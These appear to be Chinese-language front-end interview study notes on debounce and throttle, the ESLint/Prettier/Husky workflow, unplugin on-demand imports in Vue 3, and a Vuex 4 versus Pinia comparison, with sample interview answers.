这两个概念解决的是**“高频事件（如滚动、窗口大小改变、疯狂点击）引发过多函数执行”**的性能浪费。面试时，最怕把它俩搞混。

#### 1. 防抖 (Debounce)

- **核心逻辑：** 无论你触发了多少次事件，我只认**最后一次**。只有当你停止触发一段时间后，我才会执行真正的逻辑。如果你在等待期间又触发了，我就重新开始计时。
- **经典生活比喻：** 就像**上电梯**。电梯门准备关了（准备执行），这时又来了一个人（触发事件），电梯门只好重新打开，再等 5 秒。只要一直有人进，电梯就一直不走。直到 5 秒内没人进了，电梯才关门上升。
- **真实业务场景：**
  - **搜索框联想输入：** 用户疯狂打字时不要发请求，等用户打完字停顿了 0.5 秒，再发送查词 API。
  - **窗口 Resize：** 用户拖拽改变浏览器大小时，等拖拽结束了再去重新计算页面图表的大小。

#### 2. 节流 (Throttle)

- **核心逻辑：** 无论你触发事件有多快，我保证在**规定的时间间隔内，只执行一次**。
- **经典生活比喻：** 就像**FPS 游戏里的步枪射击**。你的鼠标点击速度再快（1 秒点 10 下），子弹也只能按照武器设定的射速（比如 0.2 秒发射一颗）匀速打出。在冷却时间内的点击都会被无视。
- **真实业务场景：**
  - **无限滚动加载（触底刷新）：** 监听 `scroll` 事件时，不需要毫秒级地去检查是否触底，每隔 200ms 检查一次就足够了。
  - **防止按钮疯狂连击：** 提交表单的按钮，即使网卡了，也能保证 3 秒内只能发送一次提交请求。

- **ESLint (管逻辑与质量)：** 它是“严厉的老师”。专门负责揪出代码里的潜在 Bug 和不规范写法，比如定义了变量没使用、使用了未定义的变量、不能用 `==` 必须用 `===` 等。
- **Prettier (管格式与颜值)：** 它是“强迫症理发师”。它不管你代码逻辑对不对，只管代码长得好不好看。比如单引号还是双引号、行尾要不要加分号、超过 80 个字符自动换行。
- **Husky (管大门防线)：** 它是“Git 门神”。它能拦截 Git 命令（Git Hooks）。如果没有它，开发者在本地把代码写得像屎一样也能 `git push` 上去；有了它，必须通过规范检查才能提交。

**2. 黄金工作流（你是如何把它们串起来的？）：**在面试中，你可以这样描述你的工程化落地流程：

> “为了防止团队成员把不符合规范的代码推送到代码库，我引入了 **Husky** 拦截 `pre-commit`（提交前）阶段。配合 **lint-staged**，每次提交只检查‘本次修改过的文件’（极大提升了检查速度）。在提交时，自动触发 **Prettier** 格式化代码，然后跑 **ESLint** 检查逻辑。我还配置了 **commitlint** 拦截 `commit-msg`，确保大家的 Git 提交信息（如 `feat:`, `fix:`）风格统一。这就从工程链路上彻底锁死了代码质量。”

**3. 高频防坑考点：**

- **Q：ESLint 和 Prettier 冲突了怎么办？（必问）**
- **你的回答：** “因为 ESLint 也有一些格式化规则（比如缩进），这会和 Prettier 打架。我的解法是安装 `eslint-config-prettier` 插件。把它放在 ESLint 配置的 `extends` 数组的最后一位，它的作用是**一键禁用所有和 Prettier 冲突的 ESLint 规则**，让 ESLint 专心管逻辑，Prettier 专心管格式。”

## 3. 按需导入：Unplugin 

![77408193852](C:\Users\ADMINI~1\AppData\Local\Temp\1774081938523.png)

- 核心插件:
  - `unplugin-auto-import`: 自动导入 Vue API (如 `ref`, `computed`) 和 Element Plus 函数。
  - `unplugin-vue-components`: 自动注册全局组件（包括 Element Plus 全部组件）。

**1.痛点：为什么需要按需导入？**

- **开发心智负担：** 在 Vue 3 组合式 API 中，每个文件开头都要写一堆 `import { ref, reactive, computed } from 'vue'`，还要手动引入各种 UI 组件（比如 `import { ElButton } from 'element-plus'`）。
- **产物臃肿：** 如果全局全量引入 Element Plus，哪怕只用了一个按钮，整个打包体积也会增加几百 KB。

**2. 核心原理（编译时的 AST 注入）：**面试官一定会问：“这些插件是怎么做到你不写 import，代码还能正常跑的？”

- **底层原理：** 这两个插件工作在**编译阶段（构建时）**。当 Vite/Webpack 解析你的 Vue/JS 文件时，插件会将代码转换为 **AST（抽象语法树）**。
- **自动拦截与注入：** 插件会扫描代码中的标识符（比如扫描到你用了 `ref` 或 `<el-button>`）。它会去配置好的解析器（Resolvers）里查表。一旦命中，插件就会**在编译生成最终代码前，自动帮你把对应的 import 语句动态注入到代码顶部**。
- **结果：** 开发者在源码里不需要写 import，开发体验（DX）拉满；而在最终打包的产物中，由于精准的按需注入，天然支持了 **Tree-Shaking（摇树优化）**，去除了所有没用到的组件和 API，极大减小了产物体积。

**3. 高阶面试防坑（拉开差距的关键）：**

- **Q：既然没写 import，那在 TypeScript 项目里，用到 ref 时编辑器会不会疯狂报错说“找不到名称”？**
- **高分回答：** “是的，如果不做处理，TS 和 ESLint 都会报错。这两个插件非常智能，当它们在本地开发服务器启动时，会**自动生成 .d.ts 类型声明文件**（如 `auto-imports.d.ts` 和 `components.d.ts`）。只要把这两个文件加到 `tsconfig.json` 的 `include` 中，并配置 ESLint 的 globals，不仅不会报错，还能享受完美的全局类型提示和代码补全。”

## 4.知识点

### **Vuex 4 、Pinia区别**

最直观的区别：Pinia 抛弃了 Vuex 中最让人头疼的 `mutations`。

- **Vuex 的架构 (繁琐)：** `State` -> `Getters` -> **Mutations (同步修改)** -> `Actions` (异步处理)。在 Vuex 中，你不能在 Action 中直接修改 State，必须 `commit` 一个 Mutation，这导致大量冗余的模板代码。
- **Pinia 的架构 (极简)：** `State` -> `Getters` -> **Actions (同步/异步通吃)**。Pinia 移除了 Mutation，你可以在 Action 中编写任何异步请求逻辑，并直接修改 `state.value`。

💡 一目了然的Vuex 4 、Pinia对比总结表

| **特性对比**         | **Vuex 4**                           | **Pinia**                                  |
| -------------------- | ------------------------------------ | ------------------------------------------ |
| **官方地位**         | 处于维护状态，不再增加新功能         | **当前官方推荐**的新一代状态管理器         |
| **核心构成**         | State, Getters, Mutations, Actions   | State, Getters, Actions (**无 Mutations**) |
| **模块管理**         | 树状嵌套 (`modules`)，需配置命名空间 | 扁平化，各个 Store 独立，按需调用          |
| **TypeScript 支持**  | 较差，需要复杂的自定义类型包装       | **极其完美**，开箱即用的类型推导           |
| **体积与性能**       | 较重                                 | 极轻量（约 1KB），支持更好的 Tree-shaking  |
| **服务端渲染 (SSR)** | 支持，但配置稍显复杂                 | 原生支持，且解决了交叉请求污染问题         |
